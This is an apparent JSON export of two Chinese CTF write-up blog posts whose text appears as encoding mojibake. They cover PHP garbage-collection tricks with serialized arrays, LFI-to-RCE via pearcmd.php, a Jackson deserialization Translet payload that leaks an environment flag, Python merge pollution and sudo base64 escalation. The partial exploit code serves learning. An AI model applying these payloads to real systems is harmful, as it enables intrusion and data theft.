[{"content":"å…³äºFindSecretä¸­å…³äºgcå›æ”¶ï¼ŒLFI2RCEè¿™ä¸¤å¤§è€ƒç‚¹çš„å†…å®¹\nGCå›æ”¶ ä¸ç®¡ä»»ä½•ç¼–ç¨‹è¯­è¨€ï¼Œä¸€ä¸ªå˜é‡éƒ½ä¼šä¿å­˜åœ¨å†…å­˜ä¸­ã€‚å¦‚æœä¸€ç›´å¢åŠ æ–°çš„å˜é‡ï¼Œå†…å­˜å°±ä¼šä¸€ç›´å¢åŠ ï¼Œå¦‚æœæ²¡æœ‰ä¸€ä¸ªå¥½çš„æœºåˆ¶ï¼Œé‚£ä¹ˆå†…å­˜å°±ä¼šæ— é™åˆ¶åœ°å¢åŠ æœ€ç»ˆæ’‘æ»¡æ‰€æœ‰çš„å†…å­˜ã€‚è¿™å°±é€ æˆäº†å†…å­˜æ³„éœ²ï¼ˆæº¢å‡ºï¼Ÿï¼‰ã€‚ä½†åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œé™¤éä¸€æ¬¡åŠ è½½ä¸€ä¸ªå¾ˆå¤§çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å‡ ä¹è§ä¸åˆ°å†…å­˜è¶…é™çš„é”™è¯¯ï¼Œè¿™å°±æ˜¯åƒåœ¾å›æ”¶æœºåˆ¶çš„ä½œç”¨ã€‚\nä»€ä¹ˆæ˜¯GCå›æ”¶ï¼Ÿ åœ¨ä½¿ç”¨ C è¯­è¨€çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¦æ‰‹åŠ¨ä½¿ç”¨ free æ¥é‡Šæ”¾å†…å­˜ï¼Œåœ¨ C ä¹‹åçš„å¤§éƒ¨åˆ†ç¼–ç¨‹è¯­è¨€éƒ½ä¼šè‡ªå¸¦ä¸€ä¸ªåƒåœ¾å›æ”¶ä¹‹ç±»çš„å¤„ç†èƒ½åŠ›ï¼Œä¹Ÿç§°ä¸ºGCå›æ”¶ã€‚\nIntro:PHPä¸­çš„å¼•ç”¨è®¡æ•° **refcountï¼ˆå¼•ç”¨è®¡æ•°ï¼‰**æ˜¯PHPå†…éƒ¨zvalç»“æ„ä½“ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒå­—æ®µï¼Œå®ƒæ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°ï¼Œç”¨äºè®°å½•å½“å‰å˜é‡å€¼è¢«å¼•ç”¨çš„æ¬¡æ•°ã€‚ï¼ˆæ³¨ï¼šzvalç»“æ„ä½“æ˜¯PHPä¸­æ¯ä¸ªå˜é‡åº•å±‚å¯¹åº”çš„ï¼‰\næ­£å¸¸æƒ…å†µä¸‹ï¼Œrefcount=0æ—¶ç¨‹åºä¼šç«‹å³åˆ é™¤è¿™ä¸ªå˜é‡å€¼ï¼Œå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 \u0026lt;?php // åœºæ™¯1ï¼šå­—ç¬¦ä¸²å˜é‡çš„refcountå˜åŒ– $text = \u0026#34;hello\u0026#34;; // \u0026#34;hello\u0026#34;çš„refcount = 1ï¼ˆåªæœ‰$textæŒ‡å‘å®ƒï¼‰ $copy = $text; // \u0026#34;hello\u0026#34;çš„refcount = 2ï¼ˆ$textå’Œ$copyéƒ½æŒ‡å‘å®ƒï¼‰ $another = $copy; // \u0026#34;hello\u0026#34;çš„refcount = 3 unset($copy); // \u0026#34;hello\u0026#34;çš„refcount = 2ï¼ˆ$copyä¸å†æŒ‡å‘å®ƒï¼‰ unset($another); // \u0026#34;hello\u0026#34;çš„refcount = 1 unset($text); // \u0026#34;hello\u0026#34;çš„refcount = 0 â†’ ç«‹å³åˆ é™¤è¿™ä¸ªå€¼ ä½†æ˜¯åœ¨å¾ªç¯å¼•ç”¨ä¸­ï¼Œrefcountæ— æ³•æ­£å¸¸å·¥ä½œï¼šå¯¹è±¡äº’ç›¸å¼•ç”¨åï¼Œå³ä½¿unseté”€æ¯ä¹Ÿæ— æ³•æ¶ˆé™¤å†…éƒ¨å¼•ç”¨ï¼Œå¯¼è‡´refcountâ‰ 0ï¼Œå¯¹è±¡æ— æ³•é‡Šæ”¾ï¼Œå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php class Person { public $friend; } $alice = new Person(); // refcount = 1 $bob = new Person(); // refcount = 1 // åˆ›å»ºäº’ç›¸å¼•ç”¨ $alice-\u0026gt;friend = $bob; // $bob refcount = 2 $bob-\u0026gt;friend = $alice; // $alice refcount = 2 // é—®é¢˜å‡ºç° unset($alice); // $alice refcount = 1 (è¢«$bob-\u0026gt;friendå¼•ç”¨) unset($bob); // $bob refcount = 1 (è¢«$alice-\u0026gt;friendå¼•ç”¨) // ä¸¤ä¸ªå¯¹è±¡éƒ½æ— æ³•é‡Šæ”¾ï¼Œå†…å­˜æ³„æ¼ï¼ ä½†æ˜¯PHP5.3 åå¹¶ä¸æ˜¯ç›´æ¥çœ‹æ¯ä¸ªå˜é‡çš„refcountæ˜¯å¦ä¸º0äº†ï¼Œä¹Ÿç”¨ç®—æ³•è§£å†³äº†å¾ªç¯å¼•ç”¨çš„é—®é¢˜ã€‚ä½†æ˜¯ä½œä¸ºæœ€åˆçš„GCå›æ”¶ï¼Œrefcountåˆ¤æ–­å’Œå¾ªç¯å¼•ç”¨è¿˜æ˜¯å€¼å¾—ä»‹ç»çš„\nGCå›æ”¶æœºåˆ¶ æ ¹ç¼“å†²åŒºæ”¶é›† æ£€æµ‹å¯èƒ½çš„å¾ªç¯å¼•ç”¨å¯¹è±¡ å­˜å…¥æ ¹ç¼“å†²åŒº æ¨¡æ‹Ÿåˆ é™¤ å¯¹æ¯ä¸ªå«Œç–‘å¯¹è±¡æ¨¡æ‹Ÿåˆ é™¤ï¼šæŠŠrefcountè®¾ä¸º0 éªŒè¯ æ·±åº¦éå†ï¼Œç¡®è®¤æ˜¯å¦çœŸçš„æ— å¤–éƒ¨å¼•ç”¨ å¦‚æœrefcountä¿æŒ0ï¼šç¡®è®¤ä¸ºâ€œåƒåœ¾â€ å¦‚æœrefcountå¤§äº0ï¼šä¸ä¸ºâ€œåƒåœ¾â€ï¼Œç§»å‡ºæ ¹ç¼“å†²åŒº æ¸…ç† é‡Šæ”¾â€œåƒåœ¾â€å¯¹è±¡çš„å†…å­˜ ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php class Node { public $link; } // åˆ›å»ºå¾ªç¯å¼•ç”¨é“¾ $a = new Node(); $b = new Node(); $c = new Node(); $a-\u0026gt;link = $b; $b-\u0026gt;link = $c; $c-\u0026gt;link = $a; // å½¢æˆç¯çŠ¶å¼•ç”¨ // æ–­å¼€å¤–éƒ¨å¼•ç”¨ unset($a, $b, $c); // æ­¤æ—¶ï¼š // - ä¸‰ä¸ªNodeå¯¹è±¡äº’ç›¸å¼•ç”¨ï¼Œrefcountéƒ½=1 // - è¢«åŠ å…¥æ ¹ç¼“å†²åŒºä½œä¸º\u0026#34;å«Œç–‘åƒåœ¾\u0026#34; // - GCè§¦å‘æ—¶ä¼šæ¸…ç†å®ƒä»¬ GCå›æ”¶çš„è§¦å‘æ—¶åˆ» æ ¹ç¼“å†²åŒºæ»¡æ—¶ PHPä»£ç å†…å­˜æ»¡æ—¶ è„šæœ¬ç»“æŸæ—¶ GCå›æ”¶çš„ä¸€äº›å¸¸è§ä»‹å…¥ç‚¹ å¾ªç¯å¼•ç”¨ï¼ˆå¦‚ä¸Šï¼‰ å¼‚å¸¸æ•°æ®ç»“æ„ 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php // åˆ¶é€ å¼‚å¸¸çš„åºåˆ—åŒ–æ•°æ® $data = [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;]; $serialized = serialize($data); // a:3:{i:0;s:1:\u0026#34;a\u0026#34;;i:1;s:1:\u0026#34;b\u0026#34;;i:2;s:1:\u0026#34;c\u0026#34;;} // æ‰‹åŠ¨åˆ¶é€ ç´¢å¼•å†²çª $malicious = str_replace(\u0026#39;i:1;\u0026#39;, \u0026#39;i:0;\u0026#39;, $serialized); // ç°åœ¨å˜æˆ: a:3:{i:0;s:1:\u0026#34;a\u0026#34;;i:0;s:1:\u0026#34;b\u0026#34;;i:2;s:1:\u0026#34;c\u0026#34;;} $recovered = unserialize($malicious); // GCä»‹å…¥ï¼šå¤„ç†é‡å¤ç´¢å¼•ï¼Œå¯èƒ½å˜æˆ [\u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;] // é‡æ–°åºåˆ—åŒ–æ—¶ç»“æ„æ”¹å˜ï¼Œç»•è¿‡æ£€æŸ¥ æ— æ•ˆçš„å¯¹è±¡å¼•ç”¨ 1 2 3 4 5 6 \u0026lt;?php // å¼•ç”¨ä¸å­˜åœ¨çš„å¯¹è±¡ $broken_data = \u0026#39;a:2:{i:0;O:8:\u0026#34;stdClass\u0026#34;:0:{}i:1;r:2;}\u0026#39;; // r:2 å¼•ç”¨ç¬¬äºŒä¸ªå…ƒç´ ï¼Œä½†å¯èƒ½æ— æ•ˆ $result = unserialize($broken_data); // GCä¼šæ¸…ç†æ— æ•ˆå¼•ç”¨ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®ç»“æ„å˜åŒ– ä¸€äº›é­”æœ¯æ–¹æ³•çš„GCå›æ”¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php class SerializationGC { private $data; private $references = []; public function __sleep() { // __sleepä¸­ä¿®æ”¹å¼•ç”¨å…³ç³»å¯èƒ½å½±å“GC $this-\u0026gt;references = []; // æ–­å¼€å¼•ç”¨ return [\u0026#39;data\u0026#39;]; } public function __wakeup() { // __wakeupä¸­åˆ›å»ºå¾ªç¯å¼•ç”¨ $this-\u0026gt;references[] = $this; } } $obj = new SerializationGC(); $serialized = serialize($obj); $unserialized = unserialize($serialized); // __wakeupä¸­åˆ›å»ºçš„å¾ªç¯å¼•ç”¨ä¼šè¢«GCæ£€æµ‹åˆ° Back to FindSecret å…³äºè¿™é“é¢˜çš„GCå›æ”¶ç‚¹ï¼Œå…³é”®åœ¨SecretVault::revealSecret()æ–¹æ³•ä¸­ååºåˆ—åŒ–åå†åºåˆ—åŒ–çš„æ•°æ®å¿…é¡»ä¸åŸæ•°æ®ä¸åŒæ‰èƒ½è¿›å…¥æ–‡ä»¶åŒ…å«é€»è¾‘ï¼ˆä¹Ÿæ˜¯æˆ‘åšé¢˜çš„æ—¶å€™è¢«å¡ä½çš„ç‚¹ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 // åˆ¶é€ å¼‚å¸¸åºåˆ—åŒ–æ•°æ® $evil = new SecretVault(); $d = serialize($evil); // åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ $fl = \u0026#39;../../../../\u0026#39;; $f2 = \u0026#39;../../../../usr/local/lib/php/pearcmd\u0026#39;; // åˆ›å»ºæ•°ç»„å¹¶åˆ¶é€ ç´¢å¼•å†²çª $payload_in = serialize(array($d, $fl, $f2)); $payload_in = str_replace(\u0026#39;i:1;\u0026#39;,\u0026#39;i:0;\u0026#39;,$payload_in); // åˆ¶é€ é‡å¤ç´¢å¼•0 $payload_in = str_replace(\u0026#39;i:2;\u0026#39;,\u0026#39;i:1;\u0026#39;,$payload_in); // è°ƒæ•´å…¶ä»–ç´¢å¼• GCå¤„ç†ååºåˆ—åŒ–å­—ç¬¦ä¸²å‘ç”Ÿå˜åŒ–ï¼Œç»•è¿‡æ£€æŸ¥\nLFI2RCE LFI to RCEï¼Œå³æŠŠæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´å‡çº§ä¸ºè¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè¿™é“é¢˜ç”¨äº†pearæ‹“å±•ï¼Œæ‰€ä»¥é€šè¿‡è·¯å¾„éå†å†™å…¥pearcmd.phpï¼Œç„¶åé€šè¿‡GETæ–¹æ³•é€šè¿‡pearcmdå†™å…¥webshellã€‚\nè‡³äºä¸ºä»€ä¹ˆåº”è¯¥ä½¿ç”¨pearæ‹“å±•ï¼Œåº”è¯¥æ˜¯çœ‹åˆ°äº†include ($mapFragment1 . 'secret' . $mapFragment2 . '.php')å‘ç°å¸¸è§„çš„phpä¼ªåè®®å’Œsessionæ³¨å…¥ç”¨ä¸äº†ï¼Œä»è€Œè½¬å‘pearcmd.phpã€‚è·¯å¾„/usr/local/lib/php/pearcmd.phpæ˜¯linuxç¼–è¯‘å®‰è£…PHPæ—¶çš„é»˜è®¤Pearè·¯å¾„ï¼Œæ˜¯é«˜åº¦æ ‡å‡†åŒ–çš„ã€‚\n","date":"2025-10-30T19:43:20+08:00","permalink":"https://theodorically.github.io/p/something-about-php-unserialization/","title":"Something about PHP unserialization"},{"content":"éš¾å¾—ä¸ç”¨å†™ä»¤äººæ±—é¢œçš„æ•°åˆ†ä½œä¸šï¼Œæ™šä¸ŠèŠ±ç‚¹æ—¶é—´æŠŠå‰©ä¸‹çš„é¢˜ç›®å†æ•´ç†å­¦ä¹ ä¸‹ ï¼šï¼‰\nè¥¿æŸšè¥¿æŸš è™½ç„¶æ˜¯Day1çš„é¢˜ç›®ï¼Œä½†æ˜¯å¡åœ¨å…¶ä»–é¢˜ç›®ä¸Šäº†æ²¡åšå®ƒï¼ˆ\né¦–å…ˆçœ‹çœ‹é¢˜å¹²ï¼šä»€ä¹ˆæ˜¯Jacksonï¼Ÿ\nâ€¦â€¦å¥½é—®é¢˜ï¼ æŸ¥äº†ä¸€ä¸‹ï¼ŒJacksonæ˜¯ä¸€ä¸ªç”¨äºJavaçš„JSONå¤„ç†åº“ï¼Œå¯ä»¥å°†Javaå¯¹è±¡åºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥å°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–å›Javaå¯¹è±¡ã€‚æ•…å¯ä»¥æ„é€ æ¶æ„Javaç±»ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.PrintWriter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; public class Eshell extends AbstractTranslet { public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } static { try { HttpServletRequest httpServletRequest = ((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest(); HttpServletResponse httpServletResponse = ((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getResponse(); // è¯»å–ç¯å¢ƒå˜é‡ flag String flag = System.getenv(\u0026#34;FLAG\u0026#34;); PrintWriter out = httpServletResponse.getWriter(); out.println(flag != null ? flag : \u0026#34;flag is not set\u0026#34;); out.flush(); out.close(); } catch (Exception e) { e.printStackTrace(); } } } è¯¦ç»†åˆ†æä¸€ä¸‹å®˜æ–¹ç»™å‡ºçš„Payloadä»£ç ï¼ˆå¦‚ä¸Šï¼‰\nåŒ…å¯¼å…¥éƒ¨åˆ†ï¼šéƒ¨åˆ†åŒ…çš„ä½œç”¨å¦‚ä¸‹ğŸ‘‡ åœ¨Line12å¤„ï¼Œå®šä¹‰äº†ä¸€ä¸ªç±»EShellæ¥ç»§æ‰¿AbstractTransletè¿™ä¸ªå…³é”®ç±»\nAbstractTransletæ˜¯Apache Xalan XSLTå¤„ç†å™¨çš„åŸºç¡€ç±»ï¼Œåœ¨Jacksonååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœç±»è·¯å¾„ä¸­æœ‰Xalanï¼Œå¯ä»¥è§¦å‘è¿™äº›ç±»çš„å®ä¾‹åŒ–ã€‚ ç´§æ¥ç€ï¼ŒLine14-18æ˜¯ä¸¤ä¸ªAbstractTransletçš„æŠ½è±¡æ–¹æ³•ï¼Œå¿…é¡»å®ç°ã€‚å› ä¸ºè¿™ä¸¤ä¸ªæ–¹æ³•çš„ä½œç”¨ä»…ä»…æ˜¯è®©ç±»èƒ½å¤Ÿæ­£å¸¸ç¼–è¯‘å’Œå®ä¾‹åŒ–ï¼Œæ‰€ä»¥æ–¹æ³•ä½“ä¸ºç©ºï¼ˆâ€œå½¢å¼ä¸»ä¹‰â€ï¼‰ Line20-Line37æ˜¯ä¸€ä¸ªé™æ€ä»£ç å—ï¼Œæ„é€ äº†æœ¬payloadçš„æ ¸å¿ƒæ¶æ„ä»£ç ï¼ Line22-Line23ä¸ºè·å–HTTPè¯·æ±‚å’Œå“åº”å¯¹è±¡ Line26ä¸ºè¯»å–ç¯å¢ƒå˜é‡flagï¼šhintæåˆ°å°è¯•ä¸ç”¨å‘½ä»¤ç›´æ¥è¯»å–ç¯å¢ƒå˜é‡ï¼ˆå®é™…ä¸Šæ˜¯ä¸ºäº†ç»•è¿‡RASPï¼‰ï¼Œæ‰€ä»¥æ²¡ç”¨new FileInputStream(\u0026quot;/flag\u0026quot;)ä»¥å…è§¦å‘æ–‡ä»¶è¯»å–ç›‘æ§ Line27-Line31ä¸ºè¾“å‡ºç»“æœflag å¦å¤–ï¼Œdsè¿˜ç»™å‡ºäº†ä¸€äº›å…³äºè¿™ä»½WPçš„ä»£ç é€‰æ‹©ç†ç”±ï¼š çœ‹æ¥å¾—æŠ½å‡ºæ—¶é—´å¥½å¥½å­¦å­¦Javaäº†ï¼ˆç¬‘ï¼‰\nEZ_PY ä»¤æˆ‘éå¸¸é—æ†¾çš„ä¸€é¢˜ï¼Œæœ€åä¸€å¤©ååœ¨ç”µè„‘å‰ä¸€æ™šä¸Šå¾ˆåç‰¢äº†ï¼ˆ\nå¤ç›˜ä¸‹æ¥ï¼Œæ˜¯fenjingä»£ç é”™äº†ï¼Œåœ¨ä¸æ–­çŒœflagè·¯å¾„ï¼Œè€Œä¸”WPä¸­è¿™éƒ¨åˆ†æˆ‘åœ¨å†™è„šæœ¬çš„æ—¶å€™è¯­æ³•å†™é”™äº†\nå…³äºfenjingä»£ç ä¹‹å‰çš„æ­¥éª¤ï¼Œæ¯”èµ›æ—¶æ˜¯ç”¨AI+CSDNæŠŠmergeå‡½æ•°çš„æ¼æ´ä¸€æŠŠæ¢­çš„ï¼ŒæŠŠSECRET_KEYç»™æ±¡æŸ“äº†ã€‚é¢è¯•é‚£å¤©å‘ç°è‡ªå·±å¯¹mergeå‡½æ•°çš„ç†è§£æœ‰é—®é¢˜ï¼ˆæ‚²ï¼‰ï¼Œé‚å­¦ä¹ ä¹‹\nè´´ä¸€ä¸‹åŸå‡½æ•°ï¼š\nmergeå‡½æ•°å¯ä»¥å°†ä¸€ä¸ªå­—å…¸çš„å†…å®¹åˆå¹¶åˆ°å¦ä¸€ä¸ªå¯¹è±¡ä¸­ï¼Œä¸ä»…èƒ½åˆå¹¶åˆ°å­—å…¸ï¼Œè¿˜èƒ½åˆå¹¶åˆ°ä»»ä½•Pythonå¯¹è±¡ã€‚\nforå¾ªç¯ä¼šéå†å­—å…¸srcä¸­çš„æ¯ä¸ªé”®å€¼å¯¹ï¼Œkä¸ºé”®ï¼ˆkeyï¼‰ï¼Œvä¸ºå€¼ï¼ˆvalueï¼‰ ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼šæ£€æŸ¥ç›®æ ‡æ˜¯å¦æ˜¯å­—å…¸ç±»å‹ã€‚å¦‚æœæ˜¯å­—å…¸ç±»å‹ï¼Œå·²å­˜åœ¨è¿™ä¸ªé”®ï¼Œä¸”å€¼ä¹Ÿæ˜¯å­—å…¸ï¼Œå°±é€’å½’è°ƒç”¨mergeå‡½æ•°ï¼Œç»§ç»­åˆå¹¶å†…å±‚çš„å­—å…¸ã€‚å¦‚æœä¸æ˜¯å­—å…¸ï¼Œæˆ–è€…ç›®æ ‡ä¸­æ²¡æœ‰è¿™ä¸ªé”®ï¼Œå°±ç›´æ¥ç”¨æºå€¼è¦†ç›–ç›®æ ‡å€¼ã€‚ å¦‚æœä¸æ˜¯å­—å…¸ç±»å‹ï¼Œä½†æ˜¯æœ‰åŒåå±æ€§kï¼Œä¸”æºå€¼væ˜¯å­—å…¸ï¼Œå°±é€’å½’åˆå¹¶åˆ°è¯¥å±æ€§ å¦‚æœä»¥ä¸Šæƒ…å†µéƒ½ä¸æ»¡è¶³ï¼Œå°±ç›´æ¥ç»™ç›®æ ‡å¯¹è±¡è®¾ç½®æ–°å±æ€§kï¼Œå€¼ä¸ºvã€‚\næ‰€ä»¥mergeå‡½æ•°å¯ä»¥æ·±åº¦åˆå¹¶å­—å…¸å’Œå¯¹è±¡å±æ€§ï¼Œå›åˆ°æ±¡æŸ“é“¾payloadï¼š\nå¤§è‡´æ˜¯è¿™æ ·ä¸€ä¸ªæ€è·¯ï¼š\nè¿™é‡Œçš„_init_çš„_globals_å±æ€§å¯ä»¥ä¿®æ”¹å½±å“æ•´ä¸ªæ¨¡å—ï¼Œä¸”Flaskçš„appé€šå¸¸åœ¨æ¨¡å—å…¨å±€å˜é‡ä¸­\näº‰æ¸¡ åšçš„æ—¶å€™å¡åœ¨flagçš„ææƒäº† æŸ¥è¯¢çŸ¥é“ï¼Œsudoï¼ˆSuperUser DOï¼‰æ˜¯Linux/Unixç³»ç»Ÿä¸­çš„ä¸€ä¸ªå‘½ä»¤ï¼Œå…è®¸æ™®é€šç”¨æˆ·ä»¥rootçš„æƒé™æ¥æ‰§è¡Œå‘½ä»¤ã€‚ ç”¨sudo -1æ£€æŸ¥sudoæƒé™\nNOPASSWDè¡¨æ˜ç”¨æˆ·www-dataå¯ä»¥æ— å¯†ç ä»¥rootæƒé™è¿è¡Œ/usr/bin/base64ï¼Œç”¨base64å°è¯•è¯»å–åå‘ç°æ— å›æ˜¾ï¼Œæ¥ä¸‹æ¥æŒ‰ç…§WPçš„æ­¥éª¤å³å¯\n","date":"2025-10-28T19:43:20+08:00","permalink":"https://theodorically.github.io/p/2025-tsctf-j-%E8%A5%BF%E6%9F%9A%E8%A5%BF%E6%9F%9A/ez_py/%E4%BA%89%E6%B8%A1/","title":"2025 TSCTF-J è¥¿æŸšè¥¿æŸš/EZ_PY/äº‰æ¸¡"}]